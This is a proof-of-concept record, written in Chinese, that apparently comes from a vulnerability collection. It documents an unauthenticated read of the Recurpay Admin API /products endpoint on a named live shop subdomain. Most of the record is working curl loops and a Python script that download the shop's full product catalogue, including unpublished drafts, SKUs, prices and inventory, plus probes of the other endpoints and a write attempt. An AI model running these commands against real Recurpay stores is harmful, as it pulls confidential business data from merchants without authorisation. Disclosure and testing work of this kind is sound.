# Recurpay 店铺子域 /admin/api/*/products 未鉴权读取全量商品（含未发布草稿/库存/SKU）

- **code**: recurpay-店铺子域-admin-api-products-未鉴权读取全量商品-含未发布草稿-库存-sku
- **kind**: poc
- **category**: unauthorized
- **component**: Recurpay
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: gamers-delight-online.recurpay.com 实测：无任何 token/Cookie GET /admin/api/2024-07/products → HTTP 200，290327B，page_info.total=2428；翻页 25 页得 2428 条（52 条 status=false 草稿，前台对应 handle 404）；同版本 /orders /webhooks /subscriptions /plans → 401；POST /products → 405（allow GET,HEAD），PUT/PATCH/DELETE → 404；2023-01..2025-07/latest 全部版本同样 200；响应头 Access-Control-Allow-Origin: *。2026-11-11 实测。
- **path**: pocs/recurpay-店铺子域-admin-api-products-未鉴权读取全量商品-含未发布草稿-库存-sku/poc.sh
- **tags**: recurpay,shopify,unauthorized,info-leak,admin-api,cors
- **created_at**: 2026-11-11T17:26:12.224Z
- **engine**: https://gamers-delight-online.recurpay.com

## 描述

Recurpay 每个 Shopify 店铺有独立子域 <shop>.recurpay.com，其 Admin API 代理 /admin/api/{version}/products 未鉴权：无 token 即可读取该店铺全部商品（含 status=false 未发布草稿）及 variant 的 sku/price/inventory_quantity/inventory_item_id/barcode 与 Shopify admin link。响应 Access-Control-Allow-Origin: *。仅列表漏鉴权，其余资源 401；写路径 405/404。属只读数据泄露，无权限提升面。

## 用法

```
bash -c 'SHOP=gamers-delight-online; BASE=https://$SHOP.recurpay.com/admin/api/2024-07; curl -sS "$BASE/products" | jq ".page_info"; for i in $(seq 1 25); do curl -sS "$BASE/products?page=$i"; done'  # 判断是否命中：HTTP 200 + JSON success=true + page_info.total>0，同时 $BASE/orders 返回 401 即为漏鉴权对照
```

## 正文

```
# Recurpay 店铺子域 Admin API 商品列表未鉴权

## 判据
- 目标：`https://<shop>.recurpay.com/admin/api/<version>/products`
- 无凭据 GET 返回 200 + `{"success":true,"data":{"products":[...]},"page_info":{...}}`
- 对照：同前缀 `/orders`、`/webhooks`、`/subscriptions`、`/plans` 返回 401 `Invalid API key or access token`
- 响应头 `access-control-allow-origin: *`

## PoC
```bash
SHOP=gamers-delight-online
BASE="https://$SHOP.recurpay.com/admin/api/2024-07"
curl -sS "$BASE/products" -o p1.json
curl -sS "$BASE/products?page=2" -o p2.json
# 全量
for i in $(seq 1 25); do curl -sS "$BASE/products?page=$i" -o "p$i.json"; sleep 0.5; done
python3 - <<'EOF'
import json,glob
ps=[]
for f in glob.glob('p*.json'):
    ps+=json.load(open(f))['data']['products']
print('total',len(ps),'draft',sum(1 for p in ps if p.get('status') is False))
EOF
# 对照鉴权面
for r in orders webhooks subscriptions plans; do curl -sS -o /dev/null -w "$r %{http_code}\n" "$BASE/$r"; done
# 写验证
curl -sS -X POST -H 'Content-Type: application/json' -d '{"product":{"title":"x"}}' -o /dev/null -w "POST %{http_code}\n" "$BASE/products"
```

## 注意
- 版本段（2023-01 … latest）被应用忽略，全部返回同一缓存数据；仅 `page`、`status` 参数生效，`limit/ids/q/handle/fields` 被忽略。
- `page` 无 SQLi 迹象（引号/布尔/时间/负数探针均回默认第 1 页，无差异）。
- 只读：POST → 405（allow GET,HEAD），PUT/PATCH/DELETE → 404，`X-HTTP-Method-Override` 无效。
- 不含顾客 PII；泄露为商品目录 + 52 个未发布草稿 + 库存/SKU/价格。
- 不要把测试扩展到其它店铺子域（多租户越界）。
```
